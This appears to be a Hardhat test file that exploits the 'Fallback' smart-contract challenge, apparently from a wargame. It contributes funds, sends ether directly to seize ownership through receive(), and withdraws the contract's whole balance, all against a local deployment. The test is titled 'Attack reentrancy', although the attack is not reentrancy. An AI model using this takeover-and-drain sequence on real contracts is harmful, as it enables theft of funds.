import { ethers } from "hardhat";
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Fallback } from "../typechain-types";

describe("Attack reentrancy", ()=>{
    let fallbackContract: Fallback;
    let owner:SignerWithAddress;
    let arbitrarySignerOne:SignerWithAddress;
    beforeEach(async()=>{
        // List of accounts
        const accounts = await ethers.provider.listAccounts();
        owner = await ethers.getSigner(accounts[0]);
        arbitrarySignerOne = await ethers.getSigner(accounts[1]);
        // Deploying vulnerable contract
        const fallback = await ethers.getContractFactory("Fallback");
        fallbackContract = await fallback.deploy();
    })

    it("Sanity Check", async()=>{
        // Checking if the owner is accounts[0]
        expect(await fallbackContract.owner()).to.equal(owner.address);
    })

    it("Attacking the contract", async()=>{
        // `receive` to take over `Fallback` contract, there are two condition need to be met
        // `msg.value` > 0 & contributions[msg.sender] > 0
        // add contribution form the arbitrarySignerOne
        await fallbackContract.connect(arbitrarySignerOne).contribute({value:ethers.utils.parseEther("0.0001")});
        expect(await fallbackContract.contributions(arbitrarySignerOne.address)).to.equal(ethers.utils.parseEther("0.0001"));
        // Once `contribute`, call the `receive()`
        await arbitrarySignerOne.sendTransaction({to:fallbackContract.address, value:ethers.utils.parseEther("0.0001")});
        // `arbitrarySignerOne` should be the Owner of the fallback contract now
        expect(await fallbackContract.owner()).to.equal(arbitrarySignerOne.address);
        // Withdrawing the ether from the contract
        await fallbackContract.connect(arbitrarySignerOne).withdraw();
        // Fallback contract's balance should be zero
        expect( await ethers.provider.getBalance(fallbackContract.address)).to.equal(0);
    })
})